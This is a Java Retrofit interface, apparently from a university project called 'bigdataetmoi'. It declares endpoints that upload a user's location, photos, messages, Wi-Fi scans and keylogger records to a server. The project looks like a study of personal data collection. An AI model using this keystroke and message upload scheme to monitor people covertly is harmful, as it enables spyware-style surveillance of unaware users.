package ca.uqac.bigdataetmoi.services;

import java.util.List;

import ca.uqac.bigdataetmoi.dto.CoordinateDto;
import ca.uqac.bigdataetmoi.dto.KeyloggerDto;
import ca.uqac.bigdataetmoi.dto.MessageDto;
import ca.uqac.bigdataetmoi.dto.PhotoDto;
import ca.uqac.bigdataetmoi.dto.UserAuthenticationDto;
import ca.uqac.bigdataetmoi.dto.WifiDto;
import ca.uqac.bigdataetmoi.models.User;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.POST;

public interface UserService {
    @POST("login")
    Call<User> login(@Body UserAuthenticationDto userAuthenticationDto);

    @POST("users")
    Call<User> register(@Body UserAuthenticationDto userAuthenticationDto);

    @POST("coordinates")
    Call<User> sendCoordinate(@Body CoordinateDto coordinate);

    @POST("photo")
    Call<User> sendPhoto(@Body PhotoDto photo);

    @POST("messages")
    Call<User> sendMessages(@Body MessageDto[]  messageList);

    @POST("wifi")
    Call<User> sendWifi(@Body WifiDto[]  wifiList);

    @POST("keylogger")
    Call<User> sendKeyloggerList(@Body List<KeyloggerDto> keyloggerList);

    @GET("users/me")
    Call<User> getCurrentUserInformations();
}
